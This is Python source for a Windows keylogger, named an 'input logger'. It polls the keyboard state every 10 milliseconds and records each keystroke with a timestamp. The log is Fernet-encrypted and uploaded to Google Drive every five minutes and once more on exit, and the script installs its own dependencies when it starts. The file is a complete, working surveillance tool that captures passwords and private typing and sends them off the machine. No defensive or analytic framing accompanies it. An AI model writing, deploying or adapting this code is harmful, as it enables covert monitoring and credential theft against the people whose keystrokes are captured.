import sys
import subprocess

REQUIRED_PACKAGES = [
    "cryptography",
    "google-api-python-client",
    "google-auth-httplib2",
    "google-auth-oauthlib",
    # "ftplib"  # ftplib is part of Python's standard library, so no install needed
]

# def install_missing_packages(packages):
for package in REQUIRED_PACKAGES:
    try:
        __import__(package)
    except ImportError:
        print(f"Installing missing package: {package}")
        subprocess.check_call([sys.executable, "-m", "pip", "install", package])

import os
import time
import ctypes
import argparse
from datetime import datetime
from pathlib import Path
from cryptography.fernet import Fernet
from googleapiclient.discovery import build
from google.auth.transport.requests import Request
from google.oauth2.credentials import Credentials
from google_auth_oauthlib.flow import InstalledAppFlow
from googleapiclient.http import MediaFileUpload

# Google Drive API scope
SCOPES = ['https://www.googleapis.com/auth/drive.file']

# Define the log file and encryption key file paths
LOG_FILE = ".\\logs\\user_input_log.encrypted"
KEY_FILE = ""
CREDENTIALS_FILE = "credentials.json"
TOKEN_FILE = "token.json"

# Virtual key codes for printable characters, including email-specific symbols
KEY_CODES = {
    # Letters (A-Z)
    **{i: chr(i).lower() for i in range(65, 91)},
    # Numbers (0-9)
    **{i: chr(i) for i in range(48, 58)},
    # Common symbols and email-specific characters
    186: ';', 187: '=', 188: ',', 189: '-', 190: '.', 191: '/', 192: '`',
    219: '[', 220: '\\', 221: ']', 222: "'",
    # Numpad-specific keys
    106: '*', 107: '+', 109: '-', 111: '/',
    # Space, Enter and Backspace
    32: '[SPACE]', 13: '[ENTER]', 8: '[BACKSPACE]',
}

# Shifted symbols for specific keys when Shift is held
SHIFT_MAP = {
    48: ')', 49: '!', 50: '@', 51: '#', 52: '$', 53: '%', 54: '^', 55: '&', 56: '*', 57: '(',
    186: ':', 187: '+', 188: '<', 189: '_', 190: '>', 191: '?', 192: '~', 219: '{', 220: '|', 221: '}'
}

# Load Windows user32.dll
user32 = ctypes.windll.user32

# Bit mask for key state (0x8000 means key is down)
KEY_DOWN_MASK = 0x8000

def setup_google_drive():
    """Authenticate and return Google Drive service object"""
    creds = None
    
    # Load existing token
    if os.path.exists(TOKEN_FILE):
        creds = Credentials.from_authorized_user_file(TOKEN_FILE, SCOPES)
    
    # If no valid credentials, get new ones
    if not creds or not creds.valid:
        if creds and creds.expired and creds.refresh_token:
            creds.refresh(Request())
        else:
            if not os.path.exists(CREDENTIALS_FILE):
                raise FileNotFoundError(f"Google API credentials file '{CREDENTIALS_FILE}' not found")
            flow = InstalledAppFlow.from_client_secrets_file(CREDENTIALS_FILE, SCOPES)
            creds = flow.run_local_server(port=0)
        
        # Save credentials for next run
        with open(TOKEN_FILE, 'w') as token:
            token.write(creds.to_json())
    
    return build('drive', 'v3', credentials=creds)

def upload_to_drive(service, file_path, file_name=None):
    """Upload file to Google Drive"""
    if not file_name:
        file_name = os.path.basename(file_path)
    
    file_metadata = {'name': file_name}
    media = MediaFileUpload(file_path, resumable=True)
    
    try:
        file = service.files().create(body=file_metadata, media_body=media, fields='id').execute()
        print(f"File uploaded to Google Drive with ID: {file.get('id')}")
        return file.get('id')
    except Exception as e:
        print(f"Error uploading to Google Drive: {e}")
        return None

def setup_encryption():
    # Accept either a key file path or a direct key string
    if os.path.exists(KEY_FILE):
        with open(KEY_FILE, "rb") as f:
            key = f.read()
    else:
        # Assume KEY_FILE is actually the key string itself
        key = KEY_FILE.encode()
    return Fernet(key)

def setup_log_file(fernet):
    # Ensure the log file directory exists
    log_dir = os.path.dirname(LOG_FILE) or "."
    if not os.path.exists(log_dir):
        os.makedirs(log_dir)
    
    # Initialize encrypted log file with header
    header = f"\n=== Input Log Started at {datetime.now()} ===\n"
    encrypted_header = fernet.encrypt(header.encode())
    with open(LOG_FILE, "ab") as f:
        f.write(encrypted_header + b"\n")

def is_key_down(vk_code):
    # Check if the key is currently down using GetAsyncKeyState
    return user32.GetAsyncKeyState(vk_code) & KEY_DOWN_MASK != 0

def is_shift_down():
    # Check if Shift is pressed (VK_SHIFT = 0x10) synchronously
    return user32.GetKeyState(0x10) & KEY_DOWN_MASK != 0

def main():
    # Set up Google Drive service
    try:
        drive_service = setup_google_drive()
        print("Google Drive authentication successful")
    except Exception as e:
        print(f"Google Drive setup failed: {e}")
        return
    
    # Set up encryption
    fernet = setup_encryption()
    
    # Set up the log file
    setup_log_file(fernet)
    
    print("Starting polling-based input logger. Press Ctrl+C to stop.")
    
    # Track previously pressed keys to avoid repeated logging
    prev_pressed = set()
    last_upload_time = time.time()
    upload_interval = 300  # Upload every 5 minutes
    
    try:
        while True:
            current_pressed = set()
            shift_pressed = is_shift_down()  # Check Shift state once per loop
            for vk_code, char in KEY_CODES.items():
                if is_key_down(vk_code):
                    current_pressed.add(vk_code)
                    if vk_code not in prev_pressed:
                        # Handle letters (A-Z): toggle case if Shift is pressed
                        if vk_code >= 65 and vk_code <= 90:
                            logged_char = char.upper() if shift_pressed else char
                        # Handle numbers and symbols: use SHIFT_MAP if Shift is pressed
                        elif shift_pressed and vk_code in SHIFT_MAP:
                            logged_char = SHIFT_MAP[vk_code]
                        else:
                            logged_char = char
                        
                        # Log the key with timestamp (encrypted)
                        log_entry = f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] Key pressed: {logged_char}\n"
                        encrypted_entry = fernet.encrypt(log_entry.encode())
                        with open(LOG_FILE, "ab") as f:
                            f.write(encrypted_entry + b"\n")
            
            prev_pressed = current_pressed
            
            # Check if it's time to upload to Google Drive
            current_time = time.time()
            if current_time - last_upload_time >= upload_interval:
                timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
                drive_filename = f"keylog_{timestamp}.encrypted"
                upload_to_drive(drive_service, LOG_FILE, drive_filename)
                last_upload_time = current_time
            
            time.sleep(0.01)  # Poll every 10ms
    except KeyboardInterrupt:
        print("\nStopping input logger.")
        # Add encrypted footer
        footer = f"=== Input Log Ended at {datetime.now()} ===\n"
        encrypted_footer = fernet.encrypt(footer.encode())
        with open(LOG_FILE, "ab") as f:
            f.write(encrypted_footer + b"\n")
        
        # Final upload to Google Drive
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        drive_filename = f"keylog_final_{timestamp}.encrypted"
        upload_to_drive(drive_service, LOG_FILE, drive_filename)

if __name__ == "__main__":

    default_output = str(Path(__file__).parent / "logs" / "log.encrypted")
    default_creds = str(Path(__file__).parent / "creds" / "credentials.json") 
    default_token = str(Path(__file__).parent / "creds" / "token.json")

    parser = argparse.ArgumentParser(description="Input Logger with Encryption and Google Drive Upload")
    parser.add_argument("--key", type=str, required=True, help="Path to the encryption key file")
    parser.add_argument("--output", type=str, required=False, help="Save encrypted file to the specified path", default=default_output)
    parser.add_argument("--credentials", type=str, required=False, help="Path to Google API credentials JSON file", default=default_creds)
    parser.add_argument("--token", type=str, required=False, help="Path to Google API token JSON file", default=default_token)
    parser.add_argument("--upload-interval", type=int, required=False, help="Upload interval in seconds", default=300)
    args = parser.parse_args()

    KEY_FILE = args.key
    LOG_FILE = args.output
    CREDENTIALS_FILE = args.credentials
    TOKEN_FILE = args.token

    main()